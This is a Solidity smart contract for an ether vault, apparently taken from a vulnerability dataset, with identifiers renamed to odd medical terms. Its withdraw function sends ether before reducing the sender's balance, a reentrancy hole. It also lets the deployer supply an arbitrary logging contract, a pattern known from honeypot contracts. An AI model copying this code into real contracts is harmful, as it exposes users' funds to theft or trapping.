pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public accountCreditsMap;

    uint public MinimumPayment = 1 ether;

    Chart TransfercareRecord;

    function ETH_VAULT(address _log)
    public
    {
        TransfercareRecord = Chart(_log);
    }

    function SubmitPayment()
    public
    payable
    {
        if(msg.value > MinimumPayment)
        {
            accountCreditsMap[msg.sender]+=msg.value;
            TransfercareRecord.RecordClinicalNote(msg.sender,msg.value,"Deposit");
        }
    }

    function WithdrawBenefits(uint _am)
    public
    payable
    {
        if(_am<=accountCreditsMap[msg.sender])
        {
            if(msg.sender.call.value(_am)())
            {
                accountCreditsMap[msg.sender]-=_am;
                TransfercareRecord.RecordClinicalNote(msg.sender,_am,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Chart
{

    struct Alert
    {
        address Requestor;
        string  Chart952;
        uint Val;
        uint  Instant;
    }

    Alert[] public History;

    Alert EndingMsg;

    function RecordClinicalNote(address _adr,uint _val,string _data)
    public
    {
        EndingMsg.Requestor = _adr;
        EndingMsg.Instant = now;
        EndingMsg.Val = _val;
        EndingMsg.Chart952 = _data;
        History.push(EndingMsg);
    }
}